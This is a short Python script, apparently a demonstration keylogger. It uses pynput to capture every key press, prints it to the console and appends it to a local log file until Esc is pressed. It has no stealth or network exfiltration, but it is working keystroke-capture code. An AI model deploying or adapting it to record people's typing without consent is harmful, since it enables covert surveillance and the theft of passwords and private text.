from pynput import keyboard

key_mapping = {
    keyboard.Key.space: "_",
    keyboard.Key.enter: "\n",
    keyboard.Key.tab: "\t",
    keyboard.Key.backspace: "<BACKSPACE>",
    keyboard.Key.esc: "<ESC>",
    keyboard.Key.ctrl: "<Ctrl>"
}

def on_press(key):
    try:
        print(f"Alphanumeric key {key.char} pressed")
    except AttributeError:
        print(f"Special key {key} pressed")

    write_key_to_file(key)

def write_key_to_file(key):
    with open('log.txt', 'a') as f:
        if key in key_mapping:
            f.write(key_mapping[key])
        else:
            k = str(key).replace("'", "")
            if k.startswith('Key.'):
                k = k.split('.')[1]
            f.write(k)

def on_release(key):
    print(f'{key} released')
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
